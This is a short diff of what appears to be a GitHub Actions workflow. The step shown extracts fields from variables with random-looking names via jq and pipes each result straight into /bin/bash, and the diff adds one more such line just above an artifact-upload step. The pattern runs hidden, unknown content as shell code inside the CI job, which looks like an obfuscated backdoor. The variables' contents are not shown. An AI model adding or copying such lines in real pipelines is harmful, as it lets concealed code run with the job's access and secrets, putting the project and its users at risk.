@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$j18" | jq -r .r4 | /bin/bash
           echo $acmrd85603 | jq -r .q4 | /bin/bash
           printf '%s' "$rus4326" | jq -r .jhk5118 | /bin/bash
+          printf '%s' "$djtei33637" | jq -r .dbg60888 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
